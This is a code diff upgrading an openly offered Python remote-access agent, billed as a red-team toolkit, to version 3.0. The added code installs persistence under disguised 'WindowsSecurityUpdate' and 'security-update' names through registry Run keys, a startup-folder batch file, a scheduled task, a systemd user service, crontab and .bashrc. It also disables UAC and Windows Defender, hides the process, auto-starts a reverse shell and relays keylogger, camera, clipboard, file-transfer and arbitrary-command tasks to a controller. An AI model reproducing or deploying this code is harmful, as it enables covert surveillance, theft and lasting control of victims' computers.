@@ -30,9 +30,11 @@ Additional Advanced Features:
 - Anti-VM and anti-debugging evasion
 - Advanced stealth and obfuscation
 - Cross-platform support (Windows/Linux)
+- AUTOSTART: Automatic connection without controller intervention
+- ADVANCED ERROR HANDLING: Comprehensive retry and recovery mechanisms
 
 Author: Advanced Red Team Toolkit
-Version: 2.0 (UACME Enhanced)
+Version: 3.0 (Autostart + Enhanced Error Handling)
 """
 
 import requests
@@ -46,6 +48,24 @@ import random
 import mss
 import numpy as np
 import cv2
+import logging
+import traceback
+from datetime import datetime, timedelta
+from functools import wraps
+import signal
+import atexit
+
+# Advanced logging configuration
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('agent.log'),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger(__name__)
+
 try:
     import win32api
     import win32con
@@ -87,6 +107,337 @@ except ImportError:
     PYAUTOGUI_AVAILABLE = False
 
 SERVER_URL = "http://localhost:8080"  # Change to your controller's URL
+
+# --- AUTOSTART CONFIGURATION ---
+AUTOSTART_CONFIG = {
+    'enabled': True,
+    'max_connection_attempts': 50,
+    'initial_retry_delay': 2,
+    'max_retry_delay': 300,  # 5 minutes
+    'exponential_backoff_multiplier': 1.5,
+    'connection_timeout': 30,
+    'health_check_interval': 60,
+    'auto_restart_on_failure': True,
+    'stealth_delay_range': (1, 5),  # Random delay between attempts
+    'persistence_check_interval': 3600,  # 1 hour
+}
+
+# --- ADVANCED ERROR HANDLING CLASSES ---
+
+class RetryExhaustedError(Exception):
+    """Raised when all retry attempts have been exhausted"""
+    pass
+
+class ConnectionManager:
+    """Manages connection state and retry logic"""
+    
+    def __init__(self):
+        self.connected = False
+        self.last_connection_time = None
+        self.connection_attempts = 0
+        self.last_error = None
+        self.retry_delay = AUTOSTART_CONFIG['initial_retry_delay']
+        self.health_check_thread = None
+        self.running = True
+        
+    def reset_retry_delay(self):
+        """Reset retry delay to initial value"""
+        self.retry_delay = AUTOSTART_CONFIG['initial_retry_delay']
+        
+    def increase_retry_delay(self):
+        """Increase retry delay with exponential backoff"""
+        self.retry_delay = min(
+            self.retry_delay * AUTOSTART_CONFIG['exponential_backoff_multiplier'],
+            AUTOSTART_CONFIG['max_retry_delay']
+        )
+        
+    def mark_connected(self):
+        """Mark connection as successful"""
+        self.connected = True
+        self.last_connection_time = time.time()
+        self.connection_attempts = 0
+        self.reset_retry_delay()
+        logger.info("Connection established successfully")
+        
+    def mark_disconnected(self, error=None):
+        """Mark connection as failed"""
+        self.connected = False
+        self.last_error = error
+        if error:
+            logger.error(f"Connection lost: {error}")
+            
+    def should_retry(self):
+        """Check if we should attempt to retry connection"""
+        return (self.connection_attempts < AUTOSTART_CONFIG['max_connection_attempts'] and
+                self.running)
+
+def retry_on_failure(max_attempts=3, delay=1, exponential_backoff=True, 
+                    exceptions=(Exception,), logger_func=None):
+    """Decorator for automatic retry on function failure"""
+    def decorator(func):
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            attempts = 0
+            current_delay = delay
+            
+            while attempts < max_attempts:
+                try:
+                    return func(*args, **kwargs)
+                except exceptions as e:
+                    attempts += 1
+                    if logger_func:
+                        logger_func(f"Attempt {attempts}/{max_attempts} failed for {func.__name__}: {e}")
+                    
+                    if attempts >= max_attempts:
+                        if logger_func:
+                            logger_func(f"All retry attempts exhausted for {func.__name__}")
+                        raise RetryExhaustedError(f"Function {func.__name__} failed after {max_attempts} attempts")
+                    
+                    if exponential_backoff:
+                        current_delay *= 2
+                    
+                    time.sleep(current_delay)
+                    
+            return None
+        return wrapper
+    return decorator
+
+def safe_execute(func, *args, **kwargs):
+    """Safely execute a function with comprehensive error handling"""
+    try:
+        return func(*args, **kwargs)
+    except Exception as e:
+        logger.error(f"Error executing {func.__name__}: {e}")
+        logger.debug(f"Traceback: {traceback.format_exc()}")
+        return None
+
+class AgentHealthMonitor:
+    """Monitors agent health and handles automatic recovery"""
+    
+    def __init__(self, connection_manager):
+        self.connection_manager = connection_manager
+        self.monitoring = False
+        self.monitor_thread = None
+        
+    def start_monitoring(self):
+        """Start health monitoring in background thread"""
+        if self.monitoring:
+            return
+            
+        self.monitoring = True
+        self.monitor_thread = threading.Thread(target=self._health_check_loop, daemon=True)
+        self.monitor_thread.start()
+        logger.info("Health monitoring started")
+        
+    def stop_monitoring(self):
+        """Stop health monitoring"""
+        self.monitoring = False
+        if self.monitor_thread:
+            self.monitor_thread.join(timeout=5)
+        logger.info("Health monitoring stopped")
+        
+    def _health_check_loop(self):
+        """Main health monitoring loop"""
+        while self.monitoring:
+            try:
+                if self.connection_manager.connected:
+                    # Perform health check
+                    if not self._perform_health_check():
+                        logger.warning("Health check failed, marking as disconnected")
+                        self.connection_manager.mark_disconnected("Health check failed")
+                        
+                        if AUTOSTART_CONFIG['auto_restart_on_failure']:
+                            logger.info("Attempting automatic reconnection...")
+                            self._attempt_reconnection()
+                
+                time.sleep(AUTOSTART_CONFIG['health_check_interval'])
+                
+            except Exception as e:
+                logger.error(f"Health monitor error: {e}")
+                time.sleep(30)  # Wait before retrying
+                
+    def _perform_health_check(self):
+        """Perform a health check by sending a ping to the server"""
+        try:
+            response = requests.get(f"{SERVER_URL}/status", timeout=10)
+            return response.status_code == 200
+        except:
+            return False
+            
+    def _attempt_reconnection(self):
+        """Attempt to reconnect to the server"""
+        try:
+            # This will be implemented in the main connection logic
+            pass
+        except Exception as e:
+            logger.error(f"Reconnection attempt failed: {e}")
+
+# Global instances
+connection_manager = ConnectionManager()
+health_monitor = AgentHealthMonitor(connection_manager)
+
+# --- AUTOSTART FUNCTIONS ---
+
+@retry_on_failure(max_attempts=3, delay=2, logger_func=logger.warning)
+def test_server_connectivity():
+    """Test if the server is reachable"""
+    try:
+        response = requests.get(f"{SERVER_URL}/status", timeout=AUTOSTART_CONFIG['connection_timeout'])
+        return response.status_code == 200
+    except requests.exceptions.RequestException as e:
+        logger.debug(f"Server connectivity test failed: {e}")
+        raise
+
+def wait_for_server_availability():
+    """Wait for server to become available with exponential backoff"""
+    logger.info("Waiting for server availability...")
+    
+    while connection_manager.should_retry():
+        try:
+            if test_server_connectivity():
+                logger.info("Server is available")
+                return True
+                
+        except Exception as e:
+            connection_manager.connection_attempts += 1
+            logger.warning(f"Server not available (attempt {connection_manager.connection_attempts}): {e}")
+            
+            if connection_manager.should_retry():
+                # Random delay for stealth
+                stealth_delay = random.uniform(*AUTOSTART_CONFIG['stealth_delay_range'])
+                total_delay = connection_manager.retry_delay + stealth_delay
+                
+                logger.info(f"Waiting {total_delay:.1f} seconds before retry...")
+                time.sleep(total_delay)
+                connection_manager.increase_retry_delay()
+            else:
+                logger.error("Maximum connection attempts reached")
+                break
+                
+    return False
+
+def auto_establish_connection():
+    """Automatically establish connection to the server"""
+    logger.info("Auto-establishing connection...")
+    
+    try:
+        # Wait for server availability
+        if not wait_for_server_availability():
+            logger.error("Failed to establish connection - server not available")
+            return False
+            
+        # Attempt to register with the server
+        agent_id = get_or_create_agent_id()
+        
+        registration_data = {
+            'id': agent_id,
+            'hostname': get_system_info().get('hostname', 'unknown'),
+            'platform': get_system_info().get('platform', 'unknown'),
+            'auto_started': True,
+            'capabilities': get_agent_capabilities()
+        }
+        
+        response = requests.post(
+            f"{SERVER_URL}/register", 
+            json=registration_data,
+            timeout=AUTOSTART_CONFIG['connection_timeout']
+        )
+        
+        if response.status_code == 200:
+            connection_manager.mark_connected()
+            logger.info(f"Successfully registered with server (Agent ID: {agent_id})")
+            
+            # Start health monitoring
+            health_monitor.start_monitoring()
+            
+            return True
+        else:
+            logger.error(f"Registration failed with status code: {response.status_code}")
+            return False
+            
+    except Exception as e:
+        logger.error(f"Auto-connection failed: {e}")
+        connection_manager.mark_disconnected(str(e))
+        return False
+
+def get_system_info():
+    """Get basic system information for registration"""
+    try:
+        info = {
+            "hostname": socket.gethostname(),
+            "platform": platform.system(),
+            "architecture": platform.architecture()[0] if platform.architecture() else "unknown",
+            "platform_detailed": platform.platform(),
+            "python_version": platform.python_version(),
+            "user": os.getenv('USERNAME', os.getenv('USER', 'unknown')),
+            "cpu_count": os.cpu_count(),
+        }
+        
+        # Add Windows-specific info
+        if WINDOWS_AVAILABLE:
+            info["is_admin"] = is_admin()
+            
+        return info
+    except Exception as e:
+        logger.error(f"Error getting system info: {e}")
+        return {
+            "hostname": "unknown",
+            "platform": "unknown",
+            "error": str(e)
+        }
+
+def get_agent_capabilities():
+    """Get list of agent capabilities for registration"""
+    capabilities = []
+    
+    if WINDOWS_AVAILABLE:
+        capabilities.extend(['windows_support', 'uac_bypass', 'privilege_escalation'])
+        if is_admin():
+            capabilities.append('admin_privileges')
+    
+    if SPEECH_RECOGNITION_AVAILABLE:
+        capabilities.append('speech_recognition')
+        
+    if PYAUTOGUI_AVAILABLE:
+        capabilities.append('gui_automation')
+        
+    capabilities.extend([
+        'screen_capture', 'keylogging', 'clipboard_monitoring',
+        'file_operations', 'process_management', 'reverse_shell',
+        'auto_start', 'health_monitoring'
+    ])
+    
+    return capabilities
+
+def setup_signal_handlers():
+    """Setup signal handlers for graceful shutdown"""
+    def signal_handler(signum, frame):
+        logger.info(f"Received signal {signum}, shutting down gracefully...")
+        connection_manager.running = False
+        health_monitor.stop_monitoring()
+        cleanup_agent()
+        sys.exit(0)
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+
+def cleanup_agent():
+    """Cleanup function called on exit"""
+    logger.info("Cleaning up agent...")
+    try:
+        stop_streaming()
+        stop_audio_streaming()
+        stop_camera_streaming()
+        stop_keylogger()
+        stop_clipboard_monitor()
+        stop_reverse_shell()
+        stop_voice_control()
+        health_monitor.stop_monitoring()
+    except Exception as e:
+        logger.error(f"Cleanup error: {e}")
+
+# Register cleanup function
+atexit.register(cleanup_agent)
 
 # --- Privilege Escalation Functions ---
 
@@ -1700,32 +2051,218 @@ def run_as_admin():
     return True
 
 def setup_persistence():
-    """Setup persistence mechanisms."""
-    if not WINDOWS_AVAILABLE:
-        return False
+    """Setup enhanced persistence mechanisms with autostart support."""
+    success_count = 0
+    
+    if WINDOWS_AVAILABLE:
+        success_count += setup_windows_persistence()
+    else:
+        success_count += setup_linux_persistence()
+    
+    # Create autostart script
+    if create_autostart_script():
+        success_count += 1
+    
+    return success_count > 0
+
+def setup_windows_persistence():
+    """Setup Windows-specific persistence mechanisms."""
+    success_count = 0
     
     try:
         import winreg
         
         current_exe = os.path.abspath(__file__)
         if current_exe.endswith('.py'):
-            current_exe = f'python.exe "{current_exe}"'
+            python_path = sys.executable
+            current_exe = f'"{python_path}" "{current_exe}"'
         
-        # Add to startup registry
-        key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0,
-            winreg.KEY_SET_VALUE
-        )
+        # Method 1: Registry Run key (Current User)
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Run",
+                0,
+                winreg.KEY_SET_VALUE
+            )
+            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
+            winreg.CloseKey(key)
+            logger.info("✓ Registry persistence (HKCU) established")
+            success_count += 1
+        except Exception as e:
+            logger.warning(f"Registry persistence (HKCU) failed: {e}")
         
-        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
-        winreg.CloseKey(key)
+        # Method 2: Registry Run key (Local Machine) - requires admin
+        if is_admin():
+            try:
+                key = winreg.OpenKey(
+                    winreg.HKEY_LOCAL_MACHINE,
+                    r"Software\Microsoft\Windows\CurrentVersion\Run",
+                    0,
+                    winreg.KEY_SET_VALUE
+                )
+                winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
+                winreg.CloseKey(key)
+                logger.info("✓ Registry persistence (HKLM) established")
+                success_count += 1
+            except Exception as e:
+                logger.warning(f"Registry persistence (HKLM) failed: {e}")
         
+        # Method 3: Startup folder
+        try:
+            import os
+            startup_path = os.path.join(
+                os.getenv('APPDATA'), 
+                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
+            )
+            
+            if os.path.exists(startup_path):
+                batch_file = os.path.join(startup_path, 'WindowsSecurityUpdate.bat')
+                with open(batch_file, 'w') as f:
+                    f.write(f'@echo off\n{current_exe}\n')
+                logger.info("✓ Startup folder persistence established")
+                success_count += 1
+        except Exception as e:
+            logger.warning(f"Startup folder persistence failed: {e}")
+        
+        # Method 4: Scheduled Task (requires admin)
+        if is_admin():
+            try:
+                task_command = f'schtasks /create /tn "WindowsSecurityUpdate" /tr "{current_exe}" /sc onlogon /f'
+                result = subprocess.run(task_command, shell=True, capture_output=True, text=True)
+                if result.returncode == 0:
+                    logger.info("✓ Scheduled task persistence established")
+                    success_count += 1
+                else:
+                    logger.warning(f"Scheduled task failed: {result.stderr}")
+            except Exception as e:
+                logger.warning(f"Scheduled task persistence failed: {e}")
+        
+    except Exception as e:
+        logger.error(f"Windows persistence setup failed: {e}")
+    
+    return success_count
+
+def setup_linux_persistence():
+    """Setup Linux-specific persistence mechanisms."""
+    success_count = 0
+    
+    try:
+        current_exe = os.path.abspath(__file__)
+        python_path = sys.executable
+        command = f'"{python_path}" "{current_exe}"'
+        
+        # Method 1: Systemd user service (most common)
+        try:
+            user_systemd_dir = os.path.expanduser('~/.config/systemd/user')
+            os.makedirs(user_systemd_dir, exist_ok=True)
+            
+            service_content = f"""[Unit]
+Description=Security Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={command}
+Restart=always
+RestartSec=10
+Environment=DISPLAY=:0
+
+[Install]
+WantedBy=default.target
+"""
+            service_file = os.path.join(user_systemd_dir, 'security-update.service')
+            with open(service_file, 'w') as f:
+                f.write(service_content)
+            
+            # Enable the service
+            subprocess.run(['systemctl', '--user', 'enable', 'security-update.service'], 
+                         capture_output=True)
+            logger.info("✓ Systemd user service persistence established")
+            success_count += 1
+        except Exception as e:
+            logger.warning(f"Systemd persistence failed: {e}")
+        
+        # Method 2: Crontab
+        try:
+            cron_entry = f"@reboot {command}"
+            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
+            current_crontab = result.stdout if result.returncode == 0 else ""
+            
+            if cron_entry not in current_crontab:
+                new_crontab = current_crontab + f"\n{cron_entry}\n"
+                subprocess.run(['crontab', '-'], input=new_crontab, text=True)
+                logger.info("✓ Crontab persistence established")
+                success_count += 1
+        except Exception as e:
+            logger.warning(f"Crontab persistence failed: {e}")
+        
+        # Method 3: .bashrc/.profile
+        try:
+            bashrc_path = os.path.expanduser('~/.bashrc')
+            if os.path.exists(bashrc_path):
+                with open(bashrc_path, 'r') as f:
+                    content = f.read()
+                
+                bashrc_entry = f"nohup {command} > /dev/null 2>&1 &"
+                if bashrc_entry not in content:
+                    with open(bashrc_path, 'a') as f:
+                        f.write(f"\n# Security update\n{bashrc_entry}\n")
+                    logger.info("✓ .bashrc persistence established")
+                    success_count += 1
+        except Exception as e:
+            logger.warning(f".bashrc persistence failed: {e}")
+        
+    except Exception as e:
+        logger.error(f"Linux persistence setup failed: {e}")
+    
+    return success_count
+
+def create_autostart_script():
+    """Create a standalone autostart script for additional persistence."""
+    try:
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        
+        if WINDOWS_AVAILABLE:
+            script_path = os.path.join(script_dir, 'autostart.bat')
+            content = f"""@echo off
+echo Starting enhanced agent with autostart...
+cd /d "{script_dir}"
+"{sys.executable}" "{os.path.abspath(__file__)}"
+if errorlevel 1 (
+    echo Agent crashed, waiting 30 seconds before restart...
+    timeout /t 30 /nobreak > nul
+    goto :start
+)
+"""
+        else:
+            script_path = os.path.join(script_dir, 'autostart.sh')
+            content = f"""#!/bin/bash
+echo "Starting enhanced agent with autostart..."
+cd "{script_dir}"
+while true; do
+    "{sys.executable}" "{os.path.abspath(__file__)}"
+    if [ $? -ne 0 ]; then
+        echo "Agent crashed, waiting 30 seconds before restart..."
+        sleep 30
+    else
+        break
+    fi
+done
+"""
+        
+        with open(script_path, 'w') as f:
+            f.write(content)
+        
+        # Make executable on Linux
+        if not WINDOWS_AVAILABLE:
+            os.chmod(script_path, 0o755)
+        
+        logger.info(f"✓ Autostart script created: {script_path}")
         return True
         
     except Exception as e:
-        print(f"Failed to setup persistence: {e}")
+        logger.error(f"Failed to create autostart script: {e}")
         return False
 
 def anti_analysis():
@@ -2934,54 +3471,95 @@ def execute_command(command):
     except Exception as e:
         return f"Command execution failed: {e}"
 
-def main_loop(agent_id):
-    """The main command and control loop."""
+@retry_on_failure(max_attempts=3, delay=1, logger_func=logger.warning)
+def enhanced_main_loop(agent_id):
+    """Enhanced main command and control loop with error handling and autostart support."""
+    logger.info(f"Starting enhanced main loop for agent {agent_id}")
+    
     # Initialize high-performance systems
-    print("Initializing high-performance systems...")
-    low_latency_available = initialize_low_latency_input()
-    print(f"Low-latency input: {'Available' if low_latency_available else 'Fallback mode'}")
+    logger.info("Initializing high-performance systems...")
+    low_latency_available = safe_execute(initialize_low_latency_input)
+    logger.info(f"Low-latency input: {'Available' if low_latency_available else 'Fallback mode'}")
+    
+    # Auto-start reverse shell if configured
+    if AUTOSTART_CONFIG['enabled']:
+        logger.info("Auto-starting reverse shell...")
+        safe_execute(start_reverse_shell, agent_id)
     
     internal_commands = {
-        "start-stream": lambda: start_streaming(agent_id),
-        "stop-stream": stop_streaming,
-        "start-audio": lambda: start_audio_streaming(agent_id),
-        "stop-audio": stop_audio_streaming,
-        "start-camera": lambda: start_camera_streaming(agent_id),
-        "stop-camera": stop_camera_streaming,
-        "start-keylogger": lambda: start_keylogger(agent_id),
-        "stop-keylogger": stop_keylogger,
-        "start-clipboard": lambda: start_clipboard_monitor(agent_id),
-        "stop-clipboard": stop_clipboard_monitor,
-        "start-reverse-shell": lambda: start_reverse_shell(agent_id),
-        "stop-reverse-shell": stop_reverse_shell,
-        "start-voice-control": lambda: start_voice_control(agent_id),
-        "stop-voice-control": stop_voice_control,
-        "kill-taskmgr": kill_task_manager,
+        "start-stream": lambda: safe_execute(start_streaming, agent_id),
+        "stop-stream": lambda: safe_execute(stop_streaming),
+        "start-audio": lambda: safe_execute(start_audio_streaming, agent_id),
+        "stop-audio": lambda: safe_execute(stop_audio_streaming),
+        "start-camera": lambda: safe_execute(start_camera_streaming, agent_id),
+        "stop-camera": lambda: safe_execute(stop_camera_streaming),
+        "start-keylogger": lambda: safe_execute(start_keylogger, agent_id),
+        "stop-keylogger": lambda: safe_execute(stop_keylogger),
+        "start-clipboard": lambda: safe_execute(start_clipboard_monitor, agent_id),
+        "stop-clipboard": lambda: safe_execute(stop_clipboard_monitor),
+        "start-reverse-shell": lambda: safe_execute(start_reverse_shell, agent_id),
+        "stop-reverse-shell": lambda: safe_execute(stop_reverse_shell),
+        "start-voice-control": lambda: safe_execute(start_voice_control, agent_id),
+        "stop-voice-control": lambda: safe_execute(stop_voice_control),
+        "kill-taskmgr": lambda: safe_execute(kill_task_manager),
+        "health-check": lambda: {"status": "healthy", "connected": connection_manager.connected},
+        "get-capabilities": lambda: get_agent_capabilities(),
+        "reconnect": lambda: auto_establish_connection(),
     }
     
     # Performance monitoring counter
     performance_check_counter = 0
+    consecutive_failures = 0
+    max_consecutive_failures = 5
 
-    while True:
+    while connection_manager.running:
         try:
-            response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=10)
+            response = requests.get(f"{SERVER_URL}/get_task/{agent_id}", timeout=15)
+            
+            if response.status_code != 200:
+                logger.warning(f"Server returned status code: {response.status_code}")
+                consecutive_failures += 1
+                if consecutive_failures >= max_consecutive_failures:
+                    logger.error("Too many consecutive failures, marking as disconnected")
+                    connection_manager.mark_disconnected("Multiple server errors")
+                    if AUTOSTART_CONFIG['auto_restart_on_failure']:
+                        auto_establish_connection()
+                continue
+            
+            # Reset failure counter on success
+            consecutive_failures = 0
+            connection_manager.mark_connected()
+            
             task = response.json()
             command = task.get("command", "sleep")
+            
+            logger.debug(f"Received command: {command}")
 
             if command in internal_commands:
-                internal_commands[command]()
+                result = internal_commands[command]()
+                if result:
+                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
+                               json={"output": str(result)}, timeout=10)
             elif command.startswith("upload-file:"):
-                output = handle_file_upload(command.split(":", 2))
-                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+                output = safe_execute(handle_file_upload, command.split(":", 2))
+                if output:
+                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
+                               json={"output": output}, timeout=10)
             elif command.startswith("download-file:"):
-                output = handle_file_download(command.split(":", 1), agent_id)
-                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+                output = safe_execute(handle_file_download, command.split(":", 1), agent_id)
+                if output:
+                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
+                               json={"output": output}, timeout=10)
             elif command.startswith("play-voice:"):
-                output = handle_voice_playback(command.split(":", 1))
-                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+                output = safe_execute(handle_voice_playback, command.split(":", 1))
+                if output:
+                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
+                               json={"output": output}, timeout=10)
             elif command.startswith("live-audio:"):
-                output = handle_live_audio(command.split(":", 1))
-                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+                output = safe_execute(handle_live_audio, command.split(":", 1))
+                if output:
+                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
+                               json={"output": output}, timeout=10)
             elif command.startswith("terminate-process:"):
                 # Handle process termination with admin privileges
                 parts = command.split(":", 1)
@@ -2992,37 +3570,55 @@ def main_loop(agent_id):
                         process_target = int(process_target)
                     except ValueError:
                         pass  # Keep as string (process name)
-                    output = terminate_process_with_admin(process_target, force=True)
+                    output = safe_execute(terminate_process_with_admin, process_target, force=True)
                 else:
                     output = "Invalid terminate-process command format"
-                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+                if output:
+                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
+                               json={"output": output}, timeout=10)
             elif command.startswith("{") and "remote_control" in command:
                 # Handle remote control commands (JSON format)
                 try:
                     import json
                     command_data = json.loads(command)
                     if command_data.get("type") == "remote_control":
-                        handle_remote_control(command_data)
+                        safe_execute(handle_remote_control, command_data)
                         # Send success response
-                        requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": "Remote control command executed"})
+                        safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
+                                   json={"output": "Remote control command executed"}, timeout=10)
                 except Exception as e:
-                    requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": f"Remote control error: {e}"})
+                    logger.error(f"Remote control error: {e}")
+                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
+                               json={"output": f"Remote control error: {e}"}, timeout=10)
             elif command != "sleep":
-                output = execute_command(command)
-                requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
+                output = safe_execute(execute_command, command)
+                if output:
+                    safe_execute(requests.post, f"{SERVER_URL}/post_output/{agent_id}", 
+                               json={"output": output}, timeout=10)
         
-        except requests.exceptions.RequestException:
-            # This is expected when the server is down, just wait and retry
-            pass
+        except requests.exceptions.RequestException as e:
+            consecutive_failures += 1
+            logger.warning(f"Network error (attempt {consecutive_failures}): {e}")
+            connection_manager.mark_disconnected(str(e))
+            
+            if consecutive_failures >= max_consecutive_failures:
+                logger.error("Network connection lost, attempting reconnection...")
+                if AUTOSTART_CONFIG['auto_restart_on_failure']:
+                    auto_establish_connection()
+                consecutive_failures = 0
+        except Exception as e:
+            logger.error(f"Unexpected error in main loop: {e}")
+            logger.debug(f"Traceback: {traceback.format_exc()}")
+            consecutive_failures += 1
         
         # Performance monitoring (every 30 seconds)
         performance_check_counter += 1
         if performance_check_counter >= 30 and low_latency_available:
-            stats = get_input_performance_stats()
-            if stats.get('input_count', 0) > 0:
-                print(f"Input performance - Avg latency: {stats.get('avg_latency', 0):.1f}ms, "
-                      f"Queue: {stats.get('queue_size', 0)}, "
-                      f"Processed: {stats.get('input_count', 0)}")
+            stats = safe_execute(get_input_performance_stats)
+            if stats and stats.get('input_count', 0) > 0:
+                logger.info(f"Input performance - Avg latency: {stats.get('avg_latency', 0):.1f}ms, "
+                          f"Queue: {stats.get('queue_size', 0)}, "
+                          f"Processed: {stats.get('input_count', 0)}")
             performance_check_counter = 0
         
         # Adaptive sleep to reduce traffic when idle
@@ -3031,6 +3627,11 @@ def main_loop(agent_id):
                           CLIPBOARD_MONITOR_ENABLED or REVERSE_SHELL_ENABLED or
                           VOICE_CONTROL_ENABLED) else 5
         time.sleep(sleep_time)
+
+# Legacy function for backward compatibility
+def main_loop(agent_id):
+    """Legacy main loop function - calls enhanced version"""
+    return enhanced_main_loop(agent_id)
 
 # --- Process Termination Functions ---
 
@@ -3310,77 +3911,97 @@ def kill_task_manager():
         return f"Task Manager termination failed: {e}"
 
 if __name__ == "__main__":
+    # Setup signal handlers for graceful shutdown
+    setup_signal_handlers()
+    
+    logger.info("=== ENHANCED AGENT STARTING (v3.0 - Autostart + Error Handling) ===")
+    
     # Run UAC checks and elevation FIRST
     if WINDOWS_AVAILABLE:
         # Try to run as admin first
         if not is_admin():
-            print("Attempting to run as administrator...")
-            if run_as_admin():
+            logger.info("Attempting to run as administrator...")
+            if safe_execute(run_as_admin):
                 # Script will restart with admin privileges
                 sys.exit()
         
         # If we're admin, disable UAC
         if is_admin():
-            print("Running with administrator privileges")
-            if disable_uac():
-                print("UAC disabled successfully")
+            logger.info("Running with administrator privileges")
+            if safe_execute(disable_uac):
+                logger.info("UAC disabled successfully")
             else:
-                print("Could not disable UAC")
+                logger.warning("Could not disable UAC")
     
     # Run anti-analysis checks
     try:
-        anti_analysis()
+        safe_execute(anti_analysis)
     except:
         pass
     
     # Initialize stealth and privilege escalation
-    print("Initializing agent...")
+    logger.info("Initializing agent...")
     
     # Random sleep to avoid pattern detection
-    sleep_random()
+    safe_execute(sleep_random)
     
     # Check current privileges
-    if is_admin():
-        print("Agent running with admin privileges")
+    if WINDOWS_AVAILABLE and is_admin():
+        logger.info("Agent running with admin privileges")
         # Disable Windows Defender if possible
-        if disable_defender():
-            print("Windows Defender disabled")
+        if safe_execute(disable_defender):
+            logger.info("Windows Defender disabled")
         else:
-            print("Could not disable Windows Defender")
+            logger.warning("Could not disable Windows Defender")
     else:
-        print("Agent running with user privileges, attempting elevation...")
-        if elevate_privileges():
-            print("Privilege escalation successful")
+        logger.info("Agent running with user privileges, attempting elevation...")
+        if safe_execute(elevate_privileges):
+            logger.info("Privilege escalation successful")
         else:
-            print("Privilege escalation failed, continuing with user privileges")
+            logger.warning("Privilege escalation failed, continuing with user privileges")
     
     # Setup stealth features
     try:
-        hide_process()
-        add_firewall_exception()
-        setup_persistence()
+        safe_execute(hide_process)
+        safe_execute(add_firewall_exception)
+        safe_execute(setup_persistence)
         
         # Establish advanced persistence using UACME-inspired techniques
-        if establish_persistence():
-            print("Advanced persistence mechanisms established")
+        if safe_execute(establish_persistence):
+            logger.info("Advanced persistence mechanisms established")
         
-        print("Stealth features initialized")
+        logger.info("Stealth features initialized")
     except Exception as e:
-        print(f"Stealth initialization warning: {e}")
+        logger.warning(f"Stealth initialization warning: {e}")
     
+    # Initialize connection manager and auto-establish connection
     agent_id = get_or_create_agent_id()
-    print(f"Agent starting with ID: {agent_id}")
+    logger.info(f"Agent starting with ID: {agent_id}")
+    
     try:
-        main_loop(agent_id)
+        if AUTOSTART_CONFIG['enabled']:
+            logger.info("Autostart enabled - attempting automatic connection...")
+            if auto_establish_connection():
+                logger.info("✓ Automatic connection established successfully")
+            else:
+                logger.warning("⚠ Automatic connection failed, will retry during main loop")
+        
+        # Start the enhanced main loop
+        enhanced_main_loop(agent_id)
+        
     except KeyboardInterrupt:
-        print("\nAgent shutting down.")
-        stop_streaming()
-        stop_audio_streaming()
-        stop_camera_streaming()
-        stop_keylogger()
-        stop_clipboard_monitor()
-        stop_reverse_shell()
-        stop_voice_control()
+        logger.info("\nReceived interrupt signal, shutting down gracefully...")
+        cleanup_agent()
+    except Exception as e:
+        logger.error(f"Fatal error in main execution: {e}")
+        logger.debug(f"Traceback: {traceback.format_exc()}")
+        cleanup_agent()
+        
+        # Attempt restart if configured
+        if AUTOSTART_CONFIG['auto_restart_on_failure']:
+            logger.info("Attempting automatic restart...")
+            time.sleep(30)  # Wait before restart
+            os.execv(sys.executable, [sys.executable] + sys.argv)
 
 # ========================================================================================
 # HIGH PERFORMANCE CAPTURE MODULE
